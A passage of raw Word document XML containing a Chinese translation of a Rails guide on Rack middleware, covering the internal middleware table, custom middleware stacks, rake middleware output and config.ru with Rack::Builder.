          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。你可以使用任何 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来插入，重新排列，或从堆栈中删除项目。在上一节所述的方法是只是便捷的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B193DC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例如，下面语句删除匹配所提供类名的中间件：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="418E07D9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2262C0E0" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="605043038"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.middleware.delete(middleware)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="00CFEBB3"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3.3 内部中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4391D9AA"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动作控制器的功能，大部分是作为中间件实现。下表说明了它们各自的用途：</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9"/>
        <w:gridCol w:w="4087"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5144CB4C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D582BF8" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>中间件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A9BACE6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="56E260E5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5737F0F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Rack::Lock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1824CD3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设定 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>env[“rack.multithread”]</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 标志为 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>true</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 并包裹应用到一个 Mutex 中。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3DA122C9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45AC12D3"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ActionController::Failsafe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="755AF62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如果一个分发时抛出异常，返回 HTTP 状态 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>500</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 到客户端。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="14FDA393" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69C047E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ActiveRecord::QueryCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1093E67A"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启用 Active Record 查询缓冲。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="64781256" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6178FC4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ActionDispatch::Session::CookieStore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7973A46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使用基于 cookie 的会话存储。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="43697273" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6D64492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ActionDispatch::Session::CacheStore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3B583EA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使用基于 Rails 缓存的会话存储。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5E73213B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F588C6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ActionDispatch::Session::MemCacheStore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43102BF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使用基于 memcached 的会话存储。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="37B4D348" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01CEBC5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ActiveRecord::SessionStore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="731CECC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使用基于数据库的会话存储。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="74CCD2A7" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F1A501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Rack::MethodOverride</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F7F618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基于 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>_method</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 参数或 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>env[“HTTP_X_HTTP_METHOD_OVERRIDE”]</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 设定 HTTP 方法。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="3B426CCB" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70BA385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Rack::Head</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="331156F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szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">如果客户端发送 </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>HEAD</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 请求则丢弃响应体。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E547585"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您可以使用任意上述中间件在您的定制 Rack 堆栈中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092D5DFD"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3.4 定制内部中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7B7154"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使用自定义堆栈取代整个中间件堆栈是可能的，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionController::Dispatcher.middleware=</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B762C2"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把下面的内容放入 initializer 中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="006FBF2C" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14546BA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config/initializers/stack.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05B2512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ActionController::Dispatcher.middleware = ActionController::MiddlewareStack.new</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|m|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24DF8E6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m.use ActionController::Failsafe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F669B0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m.use ActiveRecord::QueryCache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E550E7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m.use Rack::Head</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7018BF4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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A05B88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现在检查中间件堆栈：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2D906778" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2883E536"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rake middleware</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66FD1E55"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(in /Users/lifo/Rails/blog)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17819B4B"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ActionController::Failsafe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622F3BC0"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ActiveRecord::QueryCache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="491414BC"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Rack::Head</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="226C3DED"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run ActionController::Dispatcher.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17DE2D2E"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3.5 使用 Rack Builder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4177F53C"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t xml:space="preserve">下面显示了如何替换使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rack::Builder</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，而不是 Rails 提供的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>MiddlewareStack</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3207C920"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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>清除现有的 Rails 中间件堆栈</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="7937F4F5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FBBB1A8"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config/application.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E9B5C7E"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config.middleware.clear</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72BD5B21" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">添加一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.ru</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.root</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="63FC4AE5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="655DF234"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 config.ru</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6021A069"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use MyOwnStackFromScratch</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0513CF17" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
